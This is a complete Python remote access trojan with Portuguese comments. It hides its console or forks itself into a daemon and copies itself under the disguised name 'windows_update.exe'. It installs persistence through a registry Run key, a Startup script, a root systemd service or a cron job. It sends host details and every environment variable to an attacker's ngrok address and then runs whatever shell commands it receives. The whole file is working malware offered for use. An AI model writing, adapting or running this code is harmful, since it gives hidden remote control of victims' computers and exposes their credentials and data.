import os
import sys
import socket
import platform
import getpass
import subprocess
import time
import threading
import json
import ctypes
import shutil
from uuid import getnode as get_mac

SISTEMA = platform.system()

# Só importa winreg se for Windows
if SISTEMA == "Windows":
    import winreg

# --- CONFIGURAÇÕES ---
IP_ATACANTE = "0.tcp.sa.ngrok.io"  # Confirme com a saída do ngrok
PORTA = 15945   # Confirme com a saída do ngrok
DELIMITADOR = b"|||FIM|||"
ARQUIVO_ORIGINAL = os.path.abspath(sys.argv[0])
DIRETORIO_OCULTO = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Update') if SISTEMA == "Windows" else '/tmp/.system-update'
LOG_FILE = os.path.join(DIRETORIO_OCULTO, 'malware.log') if SISTEMA == "Windows" else '/tmp/malware.log'
ERROR_LOG_FILE = os.path.join(DIRETORIO_OCULTO, 'malware_error.log') if SISTEMA == "Windows" else '/tmp/malware_error.log'

# --- CRIAR DIRETÓRIO DE LOGS ---
def criar_diretorio_logs():
    try:
        if not os.path.exists(DIRETORIO_OCULTO):
            os.makedirs(DIRETORIO_OCULTO)
            if SISTEMA == "Windows":
                os.system(f'attrib +h "{DIRETORIO_OCULTO}"')
        return True
    except Exception as e:
        if SISTEMA == "Windows":
            # Fallback para C:\Temp no Windows
            global LOG_FILE, ERROR_LOG_FILE
            LOG_FILE = r'C:\Temp\malware.log'
            ERROR_LOG_FILE = r'C:\Temp\malware_error.log'
            try:
                os.makedirs(r'C:\Temp', exist_ok=True)
                return True
            except:
                return False
        return False

# --- OCULTAR PROCESSO ---
def ocultar_processo():
    if SISTEMA == "Windows":
        try:
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd:
                user32.ShowWindow(hWnd, 0)
            kernel32.FreeConsole()

            if not os.path.exists(DIRETORIO_OCULTO):
                os.makedirs(DIRETORIO_OCULTO)
                os.system(f'attrib +h "{DIRETORIO_OCULTO}"')

            novo_caminho = os.path.join(DIRETORIO_OCULTO, 'windows_update.exe')
            if not os.path.exists(novo_caminho):
                shutil.copy2(ARQUIVO_ORIGINAL, novo_caminho)
                os.system(f'attrib +h "{novo_caminho}"')
                if criar_diretorio_logs():
                    with open(LOG_FILE, 'a') as f:
                        f.write(f"[+] Script copiado para {novo_caminho} em {time.ctime()}\n")
                return novo_caminho
        except Exception as e:
            if criar_diretorio_logs():
                with open(ERROR_LOG_FILE, 'a') as f:
                    f.write(f"[Windows] Erro ao ocultar processo: {e}\n")
        return ARQUIVO_ORIGINAL
    else:
        try:
            # Primeiro fork
            pid = os.fork()
            if pid > 0:
                sys.exit(0)  # Encerra o processo pai

            # Desvincular do terminal
            os.setsid()

            # Segundo fork
            pid = os.fork()
            if pid > 0:
                sys.exit(0)  # Encerra o primeiro processo filho

            # Configurar o ambiente do daemon
            os.chdir('/')
            os.umask(0)

            # Redirecionar descritores de arquivo
            with open(os.devnull, 'r') as devnull:
                os.dup2(devnull.fileno(), sys.stdin.fileno())
            with open(os.devnull, 'a+') as devnull:
                os.dup2(devnull.fileno(), sys.stdout.fileno())
                os.dup2(devnull.fileno(), sys.stderr.fileno())

            if criar_diretorio_logs():
                with open(LOG_FILE, 'a') as f:
                    f.write(f"[+] Daemon iniciado em {time.ctime()}\n")
        except Exception as e:
            if criar_diretorio_logs():
                with open(ERROR_LOG_FILE, 'a') as f:
                    f.write(f"[Linux] Erro ao ocultar processo: {e}\n")
            sys.exit(1)
        return ARQUIVO_ORIGINAL

# --- PERSISTÊNCIA WINDOWS ---
def persistencia_windows():
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, ARQUIVO_ORIGINAL)

        startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir)
        startup_path = os.path.join(startup_dir, 'windows_update.vbs')
        with open(startup_path, 'w') as f:
            f.write(f'CreateObject("WScript.Shell").Run """{ARQUIVO_ORIGINAL}""", 0, False')
        if criar_diretorio_logs():
            with open(LOG_FILE, 'a') as f:
                f.write(f"[+] Persistência configurada no Windows em {time.ctime()}\n")
    except Exception as e:
        if criar_diretorio_logs():
            with open(ERROR_LOG_FILE, 'a') as f:
                f.write(f"[Windows] Erro ao configurar persistência: {e}\n")

# --- PERSISTÊNCIA LINUX ---
def persistencia_linux():
    try:
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {ARQUIVO_ORIGINAL}
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/system-update.service"
        with open(service_path, 'w') as f:
            f.write(service_content)

        subprocess.run(["systemctl", "enable", "system-update.service"], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl", "start", "system-update.service"], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if criar_diretorio_logs():
            with open(LOG_FILE, 'a') as f:
                f.write(f"[+] Serviço systemd configurado em {time.ctime()}\n")
    except Exception as e:
        if criar_diretorio_logs():
            with open(ERROR_LOG_FILE, 'a') as f:
                f.write(f"[Linux] Erro ao configurar serviço systemd: {e}\n")
        try:
            cron_line = f"@reboot /usr/bin/python3 {ARQUIVO_ORIGINAL} >/dev/null 2>&1\n"
            with open("/etc/cron.d/system-update", "w") as f:
                f.write(cron_line)
            if criar_diretorio_logs():
                with open(LOG_FILE, 'a') as f:
                    f.write(f"[+] Cron configurado em {time.ctime()}\n")
        except Exception as e:
            if criar_diretorio_logs():
                with open(ERROR_LOG_FILE, 'a') as f:
                    f.write(f"[Linux] Erro ao configurar cron: {e}\n")

# --- CONFIGURAR PERSISTÊNCIA ---
def configurar_persistencia():
    if SISTEMA == "Windows":
        persistencia_windows()
    else:
        persistencia_linux()

# --- TELEMETRIA ---
def coletar_telemetria():
    try:
        dados = {
            "usuario": getpass.getuser(),
            "hostname": socket.gethostname(),
            "sistema": platform.system(),
            "versao_sistema": platform.version(),
            "platforma_detalhada": platform.platform(),
            "arquitetura": platform.machine(),
            "processador": platform.processor(),
            "python_versao": platform.python_version(),
            "cwd": os.getcwd(),
            "home": os.path.expanduser("~"),
            "shell": os.environ.get("SHELL") or "N/A",
            "timezone": time.tzname,
            "idioma": os.environ.get("LANG", "N/A"),
            "diretorio_script": ARQUIVO_ORIGINAL,
            "pid": os.getpid(),
            "grupo": os.getgid() if SISTEMA != "Windows" else "N/A",
            "privilegios": (
                "Admin" if SISTEMA == "Windows" and ctypes.windll.shell32.IsUserAnAdmin() != 0
                else "Root" if SISTEMA != "Windows" and os.getuid() == 0
                else "User"
            ),
            "ip_local": socket.gethostbyname(socket.gethostname()),
            "mac": ":".join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)),
            "variaveis_ambiente": dict(os.environ),
            "uptime": subprocess.getoutput("uptime -p" if SISTEMA != "Windows" else "net stats srv | find \"Statistics since\"") if shutil.which("uptime") or SISTEMA == "Windows" else "N/A",
            "interfaces_rede": subprocess.getoutput("ip a" if SISTEMA != "Windows" else "ipconfig /all"),
            "discos": subprocess.getoutput("df -h" if SISTEMA != "Windows" else "wmic logicaldisk get size,freespace,caption"),
            "memoria": subprocess.getoutput("free -h" if SISTEMA != "Windows" else "systeminfo | findstr /C:\"Available Physical Memory\""),
            "processos": subprocess.getoutput("ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head" if SISTEMA != "Windows" else "tasklist"),
            "uuid_maquina": subprocess.getoutput("cat /sys/class/dmi/id/product_uuid" if SISTEMA != "Windows" else "wmic csproduct get uuid"),
            "pacotes_python": subprocess.getoutput("pip list --format=columns"),
        }
        return json.dumps(dados).encode() + DELIMITADOR
    except Exception as e:
        if criar_diretorio_logs():
            with open(ERROR_LOG_FILE, 'a') as f:
                f.write(f"[+] Erro ao coletar telemetria: {e}\n")
        return json.dumps({"erro": str(e)}).encode() + DELIMITADOR

# --- EXECUTAR COMANDOS ---
def executar_comando(comando):
    try:
        if comando.startswith("cd "):
            os.chdir(comando[3:].strip())
            return f"Diretório alterado para: {os.getcwd()}".encode() + DELIMITADOR
        else:
            if SISTEMA == "Windows":
                processo = subprocess.Popen(
                    ["cmd.exe", "/c", comando],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL
                )
            else:
                processo = subprocess.Popen(
                    comando,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL
                )
            saida, erro = processo.communicate()
            return (saida + erro) + DELIMITADOR
    except Exception as e:
        if criar_diretorio_logs():
            with open(ERROR_LOG_FILE, 'a') as f:
                f.write(f"[+] Erro ao executar comando {comando}: {e}\n")
        return f"ERRO: {str(e)}".encode() + DELIMITADOR

# --- CONEXÃO COM LISTENER ---
def conectar_listener():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(60)
                s.connect((IP_ATACANTE, PORTA))
                s.settimeout(None)

                s.sendall(coletar_telemetria())
                if criar_diretorio_logs():
                    with open(LOG_FILE, 'a') as f:
                        f.write(f"[+] Conexão estabelecida com {IP_ATACANTE}:{PORTA} em {time.ctime()}\n")

                while True:
                    dados = b""
                    while DELIMITADOR not in dados:
                        parte = s.recv(4096)
                        if not parte:
                            raise ConnectionError()
                        dados += parte

                    comando = dados.replace(DELIMITADOR, b"").decode().strip()
                    if comando.lower() in ["exit", "quit"]:
                        break

                    resposta = executar_comando(comando)
                    s.sendall(resposta)

        except (ConnectionRefusedError, socket.timeout) as e:
            if criar_diretorio_logs():
                with open(ERROR_LOG_FILE, 'a') as f:
                    f.write(f"[+] Erro de conexão: {e}, reconectando em 60s\n")
            time.sleep(60)
        except Exception as e:
            if criar_diretorio_logs():
                with open(ERROR_LOG_FILE, 'a') as f:
                    f.write(f"[+] Erro geral: {e}, reconectando em 300s\n")
            time.sleep(300)

# --- MAIN ---
def main():
    global ARQUIVO_ORIGINAL
    ARQUIVO_ORIGINAL = ocultar_processo()
    if criar_diretorio_logs():
        with open(LOG_FILE, 'a') as f:
            f.write(f"[+] Script iniciado em {time.ctime()}\n")
    configurar_persistencia()

    threading.Thread(target=conectar_listener, daemon=True).start()

    while True:
        time.sleep(3600)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--install":
        if SISTEMA == "Windows":
            try:
                import win32api
                import win32con
                win32api.ShellExecute(0, "open", sys.executable, f'"{ARQUIVO_ORIGINAL}"', None, win32con.SW_HIDE)
                if criar_diretorio_logs():
                    with open(LOG_FILE, 'a') as f:
                        f.write(f"[+] Script instalado com --install em {time.ctime()}\n")
            except ImportError:
                if criar_diretorio_logs():
                    with open(ERROR_LOG_FILE, 'a') as f:
                        f.write("[Windows] Erro: Módulo pywin32 não encontrado. Instale com 'pip install pywin32'\n")
                main()
            except Exception as e:
                if criar_diretorio_logs():
                    with open(ERROR_LOG_FILE, 'a') as f:
                        f.write(f"[Windows] Erro ao instalar com --install: {e}\n")
                main()
        else:
            main()
        sys.exit(0)
    else:
        main()